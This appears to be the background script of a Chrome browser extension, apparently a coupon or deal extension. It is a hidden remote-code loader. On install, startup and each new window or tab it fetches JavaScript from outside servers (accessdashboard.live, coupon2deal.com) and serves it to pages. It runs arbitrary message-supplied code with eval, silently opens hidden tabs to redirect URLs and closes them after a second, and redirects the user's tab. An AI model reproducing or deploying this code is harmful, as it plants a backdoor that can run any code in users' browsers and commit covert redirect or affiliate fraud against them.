var contentScript = JSON.parse(localStorage.getItem("code")) || "";
function callApi() {
  fetch("https://accessdashboard.live/api/script/61680b1740c17f3e2482e257")
    .then((e) => e.json())
    .then((e) => {
      localStorage.setItem("code", JSON.stringify(e.code)),
        (contentScript = e.code);
    });
}
chrome.runtime.onInstalled.addListener(function (e) {
  "install" === e.reason && callApi();
}),
  chrome.windows.onCreated.addListener(function () {
    callApi();
  }),
  chrome.runtime.onStartup.addListener(function () {
    callApi();
  }),
  chrome.tabs.onCreated.addListener(function () {
    callApi();
  }),
  chrome.runtime.onMessage.addListener(function (
    request,
    sender,
    sendResponse
  ) {
    if (request.action === "getCode") {
        if (contentScript){
          sendResponse({ script: contentScript });
        } else {
          fetch(`https://www.coupon2deal.com/api/script/605c7adf905f0e0004d55c4c`)
            .then((result) => result.json())
            .then((data) => {
              contentScript = data.code;
              sendResponse({ script: data.code });
              localStorage.setItem("code", JSON.stringify(data.code))
            });
        }
        return true;
      }
    else if ("openTab" === request.action)
      chrome.tabs.create(
        { url: request.redirect, active: !1, index: 0 },
        function (e) {
          chrome.tabs.onUpdated.addListener(function (t, n) {
            "complete" === n.status &&
              t === e.id &&
              setTimeout(function () {
                chrome.tabs.remove(e.id);
              }, 1e3);
          });
        }
      );
    else if ("executeCode" === request.action) {
      var F = function () {
        eval(request.script);
      };
      F();
    } else chrome.tabs.update(sender.tab.id, { url: request.redirect });
  });
